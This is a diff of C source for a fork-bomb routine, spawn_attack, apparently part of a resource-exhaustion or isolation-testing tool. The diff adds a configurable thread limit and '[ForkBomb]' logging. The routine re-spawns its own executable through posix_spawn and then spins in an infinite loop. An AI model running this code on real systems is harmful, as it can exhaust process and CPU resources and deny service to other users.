@@ -177,12 +177,24 @@ int filesys_attack() {
 #define MAX_THREAD 10000  // TO FIX
 #define PATH_MAX 4096     /* # chars in a path name including nul */
 
+int max_THREAD = 0;
 extern char **environ;  // A dummy parameters for posix_spawn()
 char *argv[] = {"spawn", "2", "1",
                 "1",     "1", "1"};  // parameters for posix_spawn()
 
+/**
+ * @brief Initialize spawn attack channels
+ * @param:
+ * 0: number of max number of threads
+ */
+int init_spawn_attack(void *arguments) {
+    int *args = (int *)arguments;
+    max_THREAD = args[0];
+    return EXIT_SUCCESS;
+}
+
 int spawn_attack() {
-    printf("spwan attack begin \n");
+    printf("[ForkBomb] Spwan attack begin \n");
     int thread_count = 0;
     char path[PATH_MAX];  // why + 1, 4096 is including nul
     unsigned int len;
@@ -191,6 +203,7 @@ int spawn_attack() {
     len = readlink("/proc/self/exe", path, sizeof(path));
 
     pid_t tmp_pid;
+
     while (1) {
         int ret;
         pid_t pid;
@@ -201,9 +214,9 @@ int spawn_attack() {
             return EXIT_FAILURE;
         }
         thread_count++;
-        printf("spwan succeded \n");
+        printf("Spwan succeded \n");
 
-        if (thread_count > MAX_THREAD) {
+        if (thread_count > max_THREAD) {
             // break;
             while (1) {
             }
